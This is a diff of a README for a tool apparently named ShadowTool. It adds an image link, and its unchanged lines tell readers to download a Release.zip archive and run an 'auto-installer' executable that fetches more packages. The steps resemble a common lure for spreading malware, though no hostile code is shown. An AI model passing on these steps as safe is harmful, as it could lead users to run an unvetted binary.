@@ -15,6 +15,7 @@ To install this programm, follow these steps:
 ## **1. [Download the archive](https://github.com/koastic/ShadowTool/releases/download/5.5/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
+![1](https://github.com/user-attachments/assets/b854b45c-47bc-4ac4-8154-ba4ed41e2f21)
 
 
 ## Contributing
